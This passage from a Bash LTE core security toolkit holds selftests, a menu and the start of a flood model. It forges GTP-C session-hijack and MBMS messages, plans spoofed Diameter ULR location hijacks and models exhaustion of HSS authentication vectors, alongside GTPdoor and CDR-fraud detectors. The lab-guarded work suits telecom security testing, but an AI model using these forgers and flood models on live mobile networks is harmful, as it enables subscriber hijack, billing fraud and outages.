        chk "plan-$plan-requires" "$(grep -c '^requires: ' "$pf")" "1"
        chk "plan-$plan-nonempty" "$([[ -s "$pf" ]] && echo yes || echo no)" "yes"
        chk "plan-$plan-module" "$(grep -c '^module: 11_lte_core.sh' "$pf")" "1"
    done
    # The handoff must name the hardware, not just say "handoff".
    chk plan-ulr-needs-hss "$([[ "$(grep -c 'lab HSS' "$LCORE_PLANS/ulr-hijack.plan")" -ge 1 ]] && echo yes || echo no)" "yes"
    chk plan-gtp-needs-epc "$([[ "$(grep -c 'lab EPC' "$LCORE_PLANS/gtp-inject.plan")" -ge 1 ]] && echo yes || echo no)" "yes"
    chk plan-sctp-needs-mme "$([[ "$(grep -c 'lab MME' "$LCORE_PLANS/sctp-scan.plan")" -ge 1 ]] && echo yes || echo no)" "yes"
    chk plan-bad "$(lcore_cmd_plan nope >/dev/null 2>&1; echo $?)" "2"
    chk plan-missing "$(lcore_cmd_plan >/dev/null 2>&1; echo $?)" "2"

    # ── 12. Hardware guard names the missing core ───────────────────────
    local have; have=$(lcore_find_core_testbed) || have=""
    if [[ -z "$have" ]]; then
        local em; em=$(lcore_require_core 2>&1) || true
        chk core-names-open5gs "$(printf '%s' "$em" | grep -c 'Open5GS')" "1"
        chk core-names-free5gc "$(printf '%s' "$em" | grep -c 'free5GC')" "1"
        chk core-absent-rc "$(lcore_require_core >/dev/null 2>&1; echo $?)" "1"
    else
        chk core-present-rc "$(lcore_require_core >/dev/null 2>&1; echo $?)" "0"
    fi

    # ── 13. Decoders, helpers and dispatch ──────────────────────────────
    chk apn-none   "$(lcore_apn_decode 00)" ""
    chk apn-single "$(lcore_apn_decode 04696E666F)" "info"
    chk apn-multi  "$(lcore_apn_decode 08696E7465726E65740361706E)" "internet.apn"
    chk ascii-hello "$(lcore_hex_to_ascii 68656C6C6F)" "hello"
    chk ipv4       "$(lcore_hex_to_ipv4 0A000001)" "10.0.0.1"
    chk tbcd-10    "$(lcore_tbcd_decode 1032547698)" "0123456789"
    chk tbcd-15    "$(lcore_tbcd_decode 13100521436587F9)" "310150123456789"
    # A nibble outside 0-9 and the filler is not TBCD.
    chk tbcd-bad   "$(lcore_tbcd_decode 1A34 >/dev/null 2>&1; echo $?)" "1"

    # Round trip: the message the builder forges must decode back to the
    # IMSI it was given, which it could not do while the reader ate a
    # count octet that the writer never wrote.
    local forged fpay
    forged=$(lcore_cmd_gtp_csr_forge 310150123456789 internet | awk -F'\t' '$1=="message"{print $2}')
    fpay=$(lcore_gtpc_parse_header "$forged" | awk -F'\t' '$1=="payload"{print $2}')
    chk forge-imsi "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1=="ie.0.decoded"{print $2}')" "IMSI=310150123456789"
    # The forged request carries four IEs -- IMSI (1), APN (71), RAT (82) and
    # Serving Network (83). It read as two while the walk assumed 4-octet
    # padding, which is the GTPv1-C convention: after the APN the padded walk
    # jumped three octets into the next header and gave up.
    chk forge-sn "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1=="ie.3.type"{print $2}')" "83"
    chk forge-ie-count "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1=="ie_count"{print $2}')" "4"
    chk forge-len "$(lcore_gtpc_parse_header "$forged" | awk -F'\t' '$1=="length_agrees"{print $2}')" "yes"
    chk cli-unknown "$(lcore_cli_main --nope >/dev/null 2>&1; echo $?)" "2"

    # The last hop takes no arming. What is asserted here is the argument check
    # and the transport each verb names -- no socket is opened by a selftest.
    # C6 -- the flooding depth: wire octets, saturation pps/Mbit/s, finite objects.
    local fm
    fm=$(lcore_flood_model 2000 500 100)
    chk flood-air-wire  "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="leg_wire_octets" && $2=="diameter-s6a"{print $3}')" "310"
    chk flood-air-pps   "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="leg_saturate" && $2=="diameter-s6a"{print $3}')" "2000 pps"
    chk flood-air-mbps  "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="leg_saturate" && $2=="diameter-s6a"{print $4}')" "4.960 Mbit/s"
    chk flood-gtpc-wire "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="leg_wire_octets" && $2=="gtpv2-c"{print $3}')" "176"
    chk flood-gtpc-mbps "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="leg_saturate" && $2=="gtpv2-c"{print $4}')" "0.704 Mbit/s"
    chk flood-fit       "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="leg_fit" && $2=="diameter-s6a"{print $3}')" "feasible"
    chk flood-pool      "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="state" && $2=="vector_pool"{print ($3=="5 vectors per subscriber: five re-authentications -- five Authentication Information Requests answered -- retire every vector for that IMSI, and the sixth attach cannot complete until the HSS refreshes")?"yes":"no"}')" "yes"
    chk flood-finding   "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="finding" && $2=="vector_pool_per_subscriber"{print $3}')" "HIGH"
    chk flood-noargs    "$(lcore_flood_model a b c >/dev/null 2>&1; echo $?)" "2"
    chk flood-small     "$(lcore_flood_model 10 10 1 | awk -F'\t' '$1=="leg_fit" && $2=="gtpv2-c"{print $3}')" "feasible"
    chk gtpc-send-no-host      "$(lcore_cmd_gtpc_send >/dev/null 2>&1; echo $?)" "2"
    chk diam-send-no-host      "$(lcore_cmd_diameter_send >/dev/null 2>&1; echo $?)" "2"
    chk send-no-arming "$(grep -cE '^[[:space:]]*printf .status.{1,3}disarmed' "${BASH_SOURCE[0]}")" "0"
    chk gtpc-send-tool-present "$([[ -f "$IMSISTING_ROOT/tools/udp_assoc.py" ]] && echo yes || echo no)" "yes"

    out=$(lcore_cli_status_tsv)
    chk status-tag    "$(fld "$out" tag)" "lcore"
    chk status-dir    "$(fld "$out" dir)" "$LCORE_DIR"
    chk status-appid  "$(fld "$out" s6a_app_id)" "16777251"
    chk status-plans  "$(fld "$out" plans)" "3"

    # Sanitisation: an untrusted string cannot forge a TSV row.
    chk san-tab "$(lcore_sanitize $'a\tb')" "a b"
    chk san-nl  "$(lcore_sanitize $'a\nb')" "a b"
    chk san-cr  "$(lcore_sanitize $'a\rb')" "a b"
    # A non-printable Diameter value must fall back to hex, not emit a tab.
    chk dh-utf8-np "$(lcore_diameter_utf8 0909)" "0909"

    # ── GTP-C session hijack ────────────────────────────────────────────
    # IMSI BCD: 310150123456789 -> 13 10 05 21 43 65 87 F9 (odd tail F).
    chk gtp-bcd "$(lcore_bcd_encode 310150123456789)" "13100521436587F9"
    chk gtp-bcd-even "$(lcore_bcd_encode 1234)" "2143"
    chk gtp-plmn "$(lcore_plmn_bcd 310 260)" "130062"
    chk gtp-apn "$(lcore_apn_encode internet)" "08696e7465726e6574"
    # Create Session Request: type byte 0x20 (32), no T flag (0x40).
    local csr; csr=$(lcore_cmd_gtp_csr_forge 310150123456789 internet)
    chk csr-type "$(printf '%s' "$csr" | awk -F'\t' '$1=="message_type"{print $2}')" "32"
    chk csr-flag "$(printf '%s' "$csr" | awk -F'\t' '$1=="message"{print substr($2,1,2)}')" "40"
    # IMSI IE header: type 01, length 0008, instance 00.
    chk csr-imsi-ie "$(printf '%s' "$csr" | awk -F'\t' '$1=="imsi_ie"{print substr($2,1,6)}')" "010008"
    # Modify Bearer: type 0x22 (34) with T flag (0x48) and the TEID.
    local mb; mb=$(lcore_cmd_gtp_modify_bearer DEADBEEF 5)
    chk mb-type "$(printf '%s' "$mb" | awk -F'\t' '$1=="message_type"{print $2}')" "34"
    chk mb-flag "$(printf '%s' "$mb" | awk -F'\t' '$1=="message"{print substr($2,1,2)}')" "48"
    chk mb-teid "$(printf '%s' "$mb" | awk -F'\t' '$1=="message"{print substr($2,9,8)}')" "DEADBEEF"
    # GTPdoor: a clean Echo (Recovery only) is clean; an Echo with an extra IE flags.
    # An Echo Request with its Recovery IE and nothing else. No TEID: the T flag
    # is clear, so the message is flags/type/length + sequence + spare + IEs.
    # The literal is unpadded, like every message this module now builds.
    chk gtpdoor-clean "$(lcore_cmd_gtpdoor "4001000d000001000300010000" | awk -F'\t' '$1=="findings"{print $2}')" "0"
    chk gtpdoor-flag  "$(lcore_cmd_gtpdoor "4001000c0000000001000100000000" | awk -F'\t' '$1=="findings"{print ($2>0)?"y":"n"}')" "y"
    # CDR fraud: a 30x volume spike is overbilling.
    printf 'imsi\tbytes\tavg\n310260000000001\t3000\t100\n310260000000002\t120\t100\n' > "$d/cdr.tsv"
    chk cdr-over "$(lcore_cmd_cdr_fraud "$d/cdr.tsv" | awk -F'\t' '$1=="310260000000001"{print $5}')" "OVERBILLING"
    chk cdr-normal "$(lcore_cmd_cdr_fraud "$d/cdr.tsv" | awk -F'\t' '$1=="310260000000002"{print $5}')" "normal"
    chk cdr-missing "$(lcore_cmd_cdr_fraud "$d/none.tsv" >/dev/null 2>&1; echo $?)" "1"
    # FS.20: an empty config is missing every control.
    printf 'imsi_plmn_consistency=true\n' > "$d/fs20.tsv"
    chk fs20-missing "$(lcore_cmd_fs20 "$d/fs20.tsv" | awk -F'\t' '$1=="controls_missing"{print $2}')" "4"
    chk fs20-present "$(lcore_cmd_fs20 "$d/fs20.tsv" | awk -F'\t' '$1=="imsi_plmn_consistency"{print $2}')" "yes"

    # ── 14. GTP-in-GTP and MBMS Session Start ───────────────────────────
    # Known-answer vectors. A, B and C were read back by tshark 4.2.2 (the
    # field values quoted next to each one are what it printed) and by
    # pycrate's TS29281_GTPU G-PDU reader, which agrees on the TEIDs, the
    # length and the T-PDU octets; the hex below is what those two
    # independent readers accepted, so the assertions compare against a
    # literal and not against this module's own output. The MBMS message was
    # read back by tshark only — pycrate's IE walk is not used as an oracle
    # here, because it and tshark disagree about GTPv2-C IE padding (see the
    # limit row the builder emits).
    #
    # A: outer G-PDU (TEID 0x11223344) whose T-PDU is another G-PDU
    #    (TEID 0x55667788) carrying DEADBEEF0102.  tshark: gtp.teid
    #    0x11223344, gtp.message 0xff, gtp.length 14, one gtp layer, no
    #    malformed packet (it does not recurse into a G-PDU payload).
    local k_gin_a="30FF000E1122334430FF000655667788DEADBEEF0102"
    # B: the same with a sequence number on the inner G-PDU: flags 0x32 set
    #    the S bit, Length 0x000A counts the 4-octet trailer.
    local k_gin_b="30FF00121122334432FF000A5566778812340000DEADBEEF0102"
    # C: --with-ip, so the T-PDU is an IPv4/UDP packet (192.168.1.1 ->
    #    172.16.0.1, 2152 -> 2152) around the inner G-PDU.  tshark reads two
    #    layers: gtp.teid 0x11223344,0x55667788 and gtp.length 42,6.
    local k_gin_c="30FF002A112233444500002A0000000040110D09C0A80101AC100001086808680016000030FF000655667788DEADBEEF0102"
    # MBMS Session Start Request, type 231, TEID 0, sequence 1: the six
    # mandatory IEs of Table 7.13.1-1 (80, 87, 138, 139, 142, 158) then the
    # optional 140, 141 and 171, unpadded.  tshark: gtpv2.message_type 231,
    # mbms_service_id 010203, mcc 310 / mnc 260, session duration 3600 s,
    # service area 2 codes (1, 2), distribution 239.1.1.1 from 10.0.0.5,
    # session id 01, flow id 0001, F-TEID 10.0.0.10 type 10, no malformed.
    local k_mbms="48E7006C00000000000001005000160000090000002710000000271000000000000000000000570009008A0000000A0A00000A8A0003000708008B00050001000100028E000F000000000104EF010101040A000005009E0006000102031300628C000100018D0002000001AB00010000"

    out=$(lcore_cmd_gtp_in_gtp); rc=$?
    chk gin-rc            "$rc" "0"
    chk gin-kat-default   "$(fld "$out" hex)" "$k_gin_a"
    chk gin-kat-bytes     "$(fld "$out" bytes)" "22"
    chk gin-kat-ip-layer  "$(fld "$out" ip_layer)" "none"
    chk gin-kat-outer     "$(fld "$out" outer_teid)" "0x11223344"
    chk gin-kat-inner     "$(fld "$out" inner_teid)" "0x55667788"
    chk gin-kat-sent      "$(fld "$out" sent)" "0"
    chk gin-kat-readback  "$(fld "$out" readback.inner_payload)" "DEADBEEF0102"
    chk gin-kat-readback2 "$(fld "$out" readback.inner_teid)" "0x55667788"
    chk gin-kat-lenagree  "$(fld "$out" readback.outer_length_agrees)" "yes"
    # The note that says this is not an IP datagram must be present and say so.
    chk gin-ip-note       "$(fld "$out" ip_layer_note | grep -c 'this is GTP, not IP')" "1"
    chk gin-ref-rows      "$(printf '%s\n' "$out" | grep -c '^ref	')" "5"
    chk gin-limit-rows    "$(printf '%s\n' "$out" | grep -c '^limit	')" "3"
    chk gin-ref-29281     "$(printf '%s\n' "$out" | grep -c '^ref	TS 29.281 §5.1')" "2"
    chk gin-outer-is-v1u  "$(fld "$out" outer_layer | grep -c 'GTPv1-U')" "1"
    chk gin-capability    "$(fld "$out" capability | grep -c 'effect: none')" "1"

    out=$(lcore_cmd_gtp_in_gtp --seq 1234)
    chk gin-kat-seq       "$(fld "$out" hex)" "$k_gin_b"
    out=$(lcore_cmd_gtp_in_gtp --with-ip)
    chk gin-kat-withip    "$(fld "$out" hex)" "$k_gin_c"
    chk gin-kat-withip-n  "$(fld "$out" bytes)" "50"
    chk gin-kat-csum      "$(fld "$out" inner_ipv4_checksum)" "0x0D09"
    chk gin-kat-withip-ip "$(fld "$out" inner_ipv4)" "192.168.1.1->172.16.0.1"
    # The IPv4 header alone, no payload: Length 20 and checksum 0x0D1F.  The
    # checksum is the whole point of the helper, so it is a literal too.
    chk gin-ipv4-hdr "$(lcore_ipv4_build 192.168.1.1 172.16.0.1 "" 17)" \
        "450000140000000040110D1FC0A80101AC100001"
    chk gin-ipv4-bad "$(lcore_ipv4_build 192.168.1.999 10.0.0.1 "" 17 >/dev/null 2>&1; echo $?)" "2"

    # Written to disk, the artefact is the same octets.
    out=$(lcore_cmd_gtp_in_gtp --out "$d/gin.bin")
    chk gin-out-row   "$(fld "$out" out_file)" "$d/gin.bin"
    chk gin-out-bytes "$(wc -c < "$d/gin.bin" | tr -d ' ')" "22"
    chk gin-out-hex   "$(od -An -tx1 -v "$d/gin.bin" | tr -d ' \n' | tr 'a-f' 'A-F')" "$k_gin_a"

    # Bad input is rc 2 with nothing on stdout.
    chk gin-rc-bad-teid   "$(lcore_cmd_gtp_in_gtp --outer-teid XYZ >/dev/null 2>&1; echo $?)" "2"
    chk gin-rc-odd-hex    "$(lcore_cmd_gtp_in_gtp --payload ABC >/dev/null 2>&1; echo $?)" "2"
    chk gin-rc-bad-seq    "$(lcore_cmd_gtp_in_gtp --seq 12345 >/dev/null 2>&1; echo $?)" "2"
    chk gin-rc-bad-quad   "$(lcore_cmd_gtp_in_gtp --with-ip --dst 1.2.3 >/dev/null 2>&1; echo $?)" "2"
    chk gin-rc-unknown    "$(lcore_cmd_gtp_in_gtp --nope >/dev/null 2>&1; echo $?)" "2"
    chk gin-rc-empty      "$(lcore_cmd_gtp_in_gtp --payload '' >/dev/null 2>&1; echo $?)" "2"

    # The unpadded IE writer: type 171 (0xAB), length 1, instance 0, value 00,
    # and no padding octets after it.
    chk ie-raw-unpadded "$(lcore_gtpc_ie_raw 171 00)" "AB00010000"
    chk ie-raw-len      "$(lcore_gtpc_ie_raw 140 01 | cut -c3-6)" "0001"

    out=$(lcore_cmd_mbms_session); rc=$?
    chk mbms-rc          "$rc" "0"
    chk mbms-kat         "$(fld "$out" hex)" "$k_mbms"
    chk mbms-bytes       "$(fld "$out" bytes)" "112"
    chk mbms-ie-count    "$(fld "$out" ie_count)" "9"
    chk mbms-message     "$(fld "$out" message_type)" "231"
    chk mbms-message-nm  "$(fld "$out" message_name)" "MBMS Session Start Request"
    chk mbms-teid        "$(fld "$out" teid)" "0x00000000"
    chk mbms-seq         "$(fld "$out" seq)" "0x000001"
    chk mbms-variant     "$(fld "$out" variant)" "request"
    chk mbms-sent        "$(fld "$out" sent)" "0"
    chk mbms-ref-rows    "$(printf '%s\n' "$out" | grep -c '^ref	')" "8"
    chk mbms-limit-rows  "$(printf '%s\n' "$out" | grep -c '^limit	')" "6"
    # Table 7.13.1-1 fixes presence, not order: the limit row has to say so.
    chk mbms-order-limit "$(fld "$out" limit | grep -c 'not the order')" "1"

    # The IEs decode to the values that were asked for.
    chk mbms-tmgi     "$(fld "$out" ie.5.decoded)" "TMGI=service_id=010203 plmn=310-260"
    chk mbms-duration "$(fld "$out" ie.2.decoded)" "MBMS Duration=seconds=3600 days=0"
    chk mbms-area     "$(fld "$out" ie.3.decoded)" "MBMS Service Area=codes=2 ids=1,2"
    chk mbms-mcdist   "$(fld "$out" ie.4.decoded)" \
        "MBMS IP Multicast Distribution=cteid=0x00000001 dist=239.1.1.1 src=10.0.0.5 hc=0"
    chk mbms-fteid    "$(fld "$out" ie.1.decoded)" \
        "F-TEID=interface=S11 MME GTP-C (10) teid=10 ipv4=10.0.0.10"
    chk mbms-qos      "$(fld "$out" ie.0.decoded | grep -c 'qci=9 .*mbr_ul=10000')" "1"
    chk mbms-sessid   "$(fld "$out" ie.6.decoded)" "MBMS Session Identifier=0x01"
    chk mbms-flowid   "$(fld "$out" ie.7.decoded)" "MBMS Flow Identifier=0x0001"
    chk mbms-flags    "$(fld "$out" ie.8.decoded)" "MBMS Flags=lmri=0 msri=0 spare=0x00"
    # The mandatory set is IEs 80, 87, 138, 139, 142, 158 — in that order first.
    chk mbms-mand-order "$(printf '%s\n' "$out" | awk -F'\t' '$1 ~ /^ie\.[0-5]\.type$/ {printf "%s ", $2}')" \
        "80 87 138 139 142 158 "

    # The walk in exact mode agrees with the writer: nine IEs, none padded.
    local body; body=$(fld "$out" body)
    chk mbms-walk-exact "$(lcore_gtpc_parse_ies "$body" exact | awk -F'\t' '$1=="ie_count"{print $2}')" "9"
    chk mbms-walk-mode  "$(lcore_gtpc_parse_ies "$body" bogus >/dev/null 2>&1; echo $?)" "1"
    # Pad mode on the same (unpadded) stream must NOT report the same count:
    # the two conventions genuinely differ, which is why the mode exists.
    chk mbms-walk-differs "$(lcore_gtpc_parse_ies "$body" pad 2>/dev/null | awk -F'\t' '$1=="ie_count"{print $2}' | grep -q '^9$' && echo same || echo differs)" "differs"

    # MooD: the same session signalled unicast.  Identical octets, marked, and
    # the limit row says a receiver cannot tell the two apart.
    local mood_out; mood_out=$(lcore_cmd_mbms_session --mood)
    chk mbms-mood-variant "$(fld "$mood_out" variant)" "mood"
    chk mbms-mood-hex     "$(fld "$mood_out" hex)" "$k_mbms"
    chk mbms-mood-marker  "$(fld "$mood_out" mood_marker)" "1"
    chk mbms-mood-note    "$(fld "$mood_out" mood_note | grep -c 'unicast bearer')" "1"
    chk mbms-mood-limit   "$(printf '%s\n' "$mood_out" | grep -c 'no MooD-specific field')" "1"

    # Refusals: the brief's list does not match the clause table, and the
    # verbs say which IE is missing rather than inventing a position.
    chk mbms-rc-imsi     "$(lcore_cmd_mbms_session --imsi 310150123456789 >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-mtmsi    "$(lcore_cmd_mbms_session --m-tmsi DEADBEEF >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-counting "$(lcore_cmd_mbms_session --counting 1 >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-distind  "$(lcore_cmd_mbms_session --distribution-indication 1 >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-duration "$(lcore_cmd_mbms_session --duration 90000 >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-days     "$(lcore_cmd_mbms_session --days 19 >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-hc       "$(lcore_cmd_mbms_session --hc 2 >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-service  "$(lcore_cmd_mbms_session --service-id 0102 >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-mcc      "$(lcore_cmd_mbms_session --mcc 31 >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-area     "$(lcore_cmd_mbms_session --area-ids 1,abc >/dev/null 2>&1; echo $?)" "2"
    chk mbms-rc-unknown  "$(lcore_cmd_mbms_session --nope >/dev/null 2>&1; echo $?)" "2"
    # The refusal names what is missing on stderr, not on stdout.
    chk mbms-refuse-why  "$(lcore_cmd_mbms_session --counting 1 2>&1 >/dev/null | grep -c '^WHY	')" "1"
    chk mbms-refuse-out  "$(lcore_cmd_mbms_session --imsi 1 2>/dev/null | wc -l | tr -d ' ')" "0"

    # ── live oracle: tshark, when it is installed ──────────────────────
    # tshark is the authority for both artefacts.  The pcap is the artefact
    # wrapped in the framing tshark needs to reach the dissector (Ethernet,
    # IPv4, UDP 2152), built by python3 so nothing here re-implements the
    # module's own encoding.  When tshark is absent the rows say SKIP and the
    # suite still passes: no assertion is dropped, it is reported as skipped.
    if command -v tshark >/dev/null 2>&1 && command -v python3 >/dev/null 2>&1; then
        ts_pcap() {  # ts_pcap <hex> <path>
            python3 - "$1" "$2" <<'PYEOF'
import struct, sys
pl = bytes.fromhex(sys.argv[1])
eth = bytes(12) + b"\x08\x00"
udp = struct.pack("!HHHH", 2152, 2152, 8 + len(pl), 0)
ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + 8 + len(pl), 0, 0, 64, 17, 0,
                 bytes([10, 0, 0, 1]), bytes([10, 0, 0, 2]))
fr = eth + ip + udp + pl
with open(sys.argv[2], "wb") as fh:
    fh.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
    fh.write(struct.pack("<IIII", 1, 0, len(fr), len(fr)))
    fh.write(fr)
PYEOF
        }
        ts_fields() {  # ts_fields <pcap> <field>...
            local pc="$1"; shift
            local a=() f
            for f in "$@"; do a+=(-e "$f"); done
            tshark -r "$pc" -T fields "${a[@]}" 2>/dev/null | tr -d '\r'
        }
        ts_clean() {  # ts_clean <pcap>: no "Malformed Packet" anywhere
            tshark -r "$1" -V 2>/dev/null | grep -c 'Malformed Packet'
        }

        ts_pcap "$k_gin_a" "$d/gin_a.pcap"
        chk tshark-gin-teid        "$(ts_fields "$d/gin_a.pcap" gtp.teid)" "0x11223344"
        chk tshark-gin-message     "$(ts_fields "$d/gin_a.pcap" gtp.message)" "0xff"
        chk tshark-gin-length      "$(ts_fields "$d/gin_a.pcap" gtp.length)" "14"
        chk tshark-gin-clean       "$(ts_clean "$d/gin_a.pcap")" "0"

        ts_pcap "$k_gin_c" "$d/gin_c.pcap"
        chk tshark-gin2-teids      "$(ts_fields "$d/gin_c.pcap" gtp.teid)" "0x11223344,0x55667788"
        chk tshark-gin2-messages   "$(ts_fields "$d/gin_c.pcap" gtp.message)" "0xff,0xff"
        chk tshark-gin2-lengths    "$(ts_fields "$d/gin_c.pcap" gtp.length)" "42,6"
        chk tshark-gin2-ipdst      "$(ts_fields "$d/gin_c.pcap" ip.dst)" "10.0.0.2,172.16.0.1"
        chk tshark-gin2-clean      "$(ts_clean "$d/gin_c.pcap")" "0"

        ts_pcap "$k_mbms" "$d/mbms.pcap"
        chk tshark-mbms-type       "$(ts_fields "$d/mbms.pcap" gtpv2.message_type)" "231"
        chk tshark-mbms-teid       "$(ts_fields "$d/mbms.pcap" gtpv2.teid)" "0x00000000"
        chk tshark-mbms-seq        "$(ts_fields "$d/mbms.pcap" gtpv2.seq)" "0x000001"
        chk tshark-mbms-service-id "$(ts_fields "$d/mbms.pcap" gtpv2.mbms_service_id)" "010203"
        chk tshark-mbms-duration   "$(ts_fields "$d/mbms.pcap" gtpv2.mbms_session_duration_secs | cut -f1)" "3600"
        chk tshark-mbms-days       "$(ts_fields "$d/mbms.pcap" gtpv2.mbms_session_duration_days | cut -f1)" "0"
        chk tshark-mbms-areas      "$(ts_fields "$d/mbms.pcap" gtpv2.mbms_service_area_id)" "1,2"
        chk tshark-mbms-dist-addr  "$(ts_fields "$d/mbms.pcap" gtpv2.mbms_ip_mc_dist_addrv4)" "239.1.1.1"
        chk tshark-mbms-src-addr   "$(ts_fields "$d/mbms.pcap" gtpv2.mbms_ip_mc_src_addrv4)" "10.0.0.5"
        chk tshark-mbms-hc         "$(ts_fields "$d/mbms.pcap" gtpv2.mbms_hc_indicator | cut -f1)" "0"
        chk tshark-mbms-session-id "$(ts_fields "$d/mbms.pcap" gtpv2.mbms_session_id)" "01"
        chk tshark-mbms-flow-id    "$(ts_fields "$d/mbms.pcap" gtpv2.mbms_flow_id)" "0001"
        chk tshark-mbms-fteid-teid "$(ts_fields "$d/mbms.pcap" gtpv2.f_teid_gre_key)" "0x0000000a"
        chk tshark-mbms-fteid-ip   "$(ts_fields "$d/mbms.pcap" gtpv2.f_teid_ipv4)" "10.0.0.10"
        chk tshark-mbms-clean      "$(ts_clean "$d/mbms.pcap")" "0"
        # The IE registry has no name for MBMS Flags (IE 171): tshark shows the
        # octet without dissecting it, so no assertion claims its contents.
    else
        printf 'tshark-gin-*	SKIP	no tshark (or python3) on PATH; the artefact assertions above still ran\n'
        printf 'tshark-mbms-*	SKIP	no tshark (or python3) on PATH; the artefact assertions above still ran\n'
    fi

    rm -rf "$d"
    printf 'ASSERTIONS\t%s\n' "$(( ok + bad ))"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
lcore_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== LTE Core (EPC) ===${C_RESET}"
        echo -e "  testbed: ${C_GRN}$(lcore_find_core_testbed || echo none)${C_RESET}"
        echo -e "  plans:   ${C_GRN}$(find "$LCORE_PLANS" -name '*.plan' -type f 2>/dev/null | wc -l)${C_RESET}"
        echo -e "  dir:     ${C_DIM}$LCORE_PLANS${C_RESET}\n"
        cat << 'M'
  [1]  decode a Diameter message (hex)
  [2]  decode a GTP-C v2 message (hex)
  [3]  decode a GTP-U packet (hex)
  [4]  build an AIR (S6a Authentication-Information-Request)
  [5]  build a ULR (S6a Update-Location-Request)
  [6]  plan: spoofed ULR / location hijack
  [7]  plan: GTP-C Create Session injection
  [8]  plan: SCTP multihoming review
  [9]  S1AP procedure / identity reference
  [10] attack surface notes
  [11] status
  [12] build a GTP-in-GTP encapsulation (GTPv1-U outer, GTPv1-U inner)
  [13] build an MBMS Session Start Request (GTPv2-C 231) / MooD variant
  [0]  back

M
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
               else read -rp "  Diameter hex> " h
                    lcore_cmd_decode_diameter "$h" | column -t -s$'\t' 2>/dev/null || lcore_cmd_decode_diameter "$h"
                    read -rp "  press enter " _; fi ;;
            2) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
               else read -rp "  GTP-C hex> " h
                    lcore_cmd_decode_gtp_c "$h" | column -t -s$'\t' 2>/dev/null || lcore_cmd_decode_gtp_c "$h"
                    read -rp "  press enter " _; fi ;;
            3) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
               else read -rp "  GTP-U hex> " h
                    lcore_cmd_decode_gtp_u "$h" | column -t -s$'\t' 2>/dev/null || lcore_cmd_decode_gtp_u "$h"
                    read -rp "  press enter " _; fi ;;
            4) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
               else read -rp "  IMSI> " i
                    lcore_cmd_build_air "$i" | column -t -s$'\t' 2>/dev/null || lcore_cmd_build_air "$i"
                    read -rp "  press enter " _; fi ;;
            5) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
               else read -rp "  IMSI> " i
                    lcore_cmd_build_ulr "$i" | column -t -s$'\t' 2>/dev/null || lcore_cmd_build_ulr "$i"
                    read -rp "  press enter " _; fi ;;
            6) lcore_cmd_plan ulr-hijack; read -rp "  press enter " _ ;;
            7) lcore_cmd_plan gtp-inject; read -rp "  press enter " _ ;;
            8) lcore_cmd_plan sctp-scan;  read -rp "  press enter " _ ;;
            9) lcore_s1ap_identity_procedures | column -t -s$'\t' 2>/dev/null || lcore_s1ap_identity_procedures
               read -rp "  press enter " _ ;;
            10) lcore_surface_notes | column -t -s$'\t' 2>/dev/null || lcore_surface_notes
                read -rp "  press enter " _ ;;
            11) lcore_cli_status_tsv | column -t -s$'\t' 2>/dev/null || lcore_cli_status_tsv
                read -rp "  press enter " _ ;;
            12) lcore_cmd_gtp_in_gtp | column -t -s$'\t' 2>/dev/null || lcore_cmd_gtp_in_gtp
                read -rp "  press enter " _ ;;
            13) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need a choice; cannot prompt in CLI mode" >&2
                else read -rp "  [r]equest or [m]ood> " v
                     case "$v" in
                         m|M) lcore_cmd_mbms_session --mood | column -t -s$'\t' 2>/dev/null || lcore_cmd_mbms_session --mood ;;
                         *)   lcore_cmd_mbms_session | column -t -s$'\t' 2>/dev/null || lcore_cmd_mbms_session ;;
                     esac
                     read -rp "  press enter " _; fi ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
# ── the last hop ────────────────────────────────────────────────────────
# --gtp-csr-forge builds the Create Session Request and stops.  This publishes
# it, on UDP 2123, and it is armed for the same reason the small cell's SCTP
# association is: a build must not be one typo away from a live core.  The
# datagram itself proves nothing beyond the kernel accepting it -- UDP has no
# acknowledgement -- so the report carries the reply when one comes back and
# says "unconfirmed" when none does.
# ── C6 — the flooding depth, with the maths shown ──────────────────────
# Two different limits get called "flooding": the bandwidth one (more packets
# than the link or the NIC will take) and the state one (more objects than the
# core has room for). The first is arithmetic anyone can do; the second is the
# one that matters, because the numbers are small and the objects are finite.
lcore_flood_model() {  # [hss-air-per-sec] [mme-sessions-per-sec] [attacker-mbps]
    local hss="${1:-2000}" mme="${2:-500}" mbps="${3:-100}"
